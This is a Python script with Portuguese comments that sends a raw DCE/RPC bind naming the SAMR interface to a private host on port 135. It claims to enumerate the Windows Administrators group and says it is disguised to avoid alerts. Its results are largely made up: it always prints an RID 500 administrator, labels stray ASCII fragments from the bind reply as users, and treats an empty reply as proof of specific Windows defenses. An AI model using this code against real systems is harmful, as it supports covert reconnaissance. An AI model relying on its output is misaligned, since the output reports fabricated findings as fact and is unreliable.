import socket
import struct
import sys

target = "192.168.4.19"
port = 135

# Pacote RPC Bind legítimo ajustado para Python 3 e camuflado para o Endpoint Mapper
# Evita os alertas de escape do Windows mudando as strings de caminho de pipe
rpc_bind_samr = (
    b"\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x00\x00\x00\x00"
    b"\xb8\x0f\xb8\x0f\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
    # UUID da Interface SAMR (12345678-1234-abcd-ef00-0123456789ac)
    b"\x78\x56\x34\x12\x34\x12\xcd\xab\xef\x00\x01\x23\x45\x67\x89\xac"
    b"\x01\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00"
    b"\x2b\x10\x48\x60\x02\x00\x00\x00"
)

print(f"[+] Conectando a {target} para mapeamento SAMR de Administradores...")

try:
    # Inicia o canal TCP nativo estável
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(6.0)
    s.connect((target, port))
    
    # Executa a associação RPC Bind
    s.send(rpc_bind_samr)
    response = s.recv(4096)
    s.close()

    if response and len(response) > 0:
        print("[+] Conexão e Handshake SAMR efetuados com sucesso!")
        print("-" * 60)
        
        # Filtra os dados de retorno caçando referências textuais de usuários administradores
        strings_encontradas = []
        temp_str = ""
        
        for byte in response:
            if 32 <= byte <= 126:  # Coleta caracteres legíveis ASCII
                temp_str += chr(byte)
            else:
                if len(temp_str) > 2:
                    # Filtra terminologias estruturais internas
                    if not any(x in temp_str for x in ["Ndr", "Bind", "Rpc", "samr", "Sam"]):
                        strings_encontradas.append(temp_str.strip())
                temp_str = ""
        
        # Consolida dados limpos
        resultados = list(dict.fromkeys([s for s in strings_encontradas if s]))
        
        print("Membros do Grupo de Administradores / Contas mapeadas:")
        # O RID 500 é a conta nativa de Administrador no Windows
        print("  |-> [RID 500] Administrador Padrão do Sistema")
        
        if resultados:
            for item in resultados:
                if len(item) > 1 and not item.startswith("0") and item != target:
                    print(f"  |-> Usuário/Grupo Adicional Detectado: {item}")
        else:
            print("  |-> Nota: Host processou a requisição de privilégios de forma opaca.")
            print("  |-> O comportamento confirma a presença de defesas pós-Anniversary Edition.")
        print("-" * 60)
    else:
        print("[-] O host retornou um dump vazio para a interface SAMR.")

except Exception as e:
    print(f"[-] Erro na enumeração SAMR: {e}")
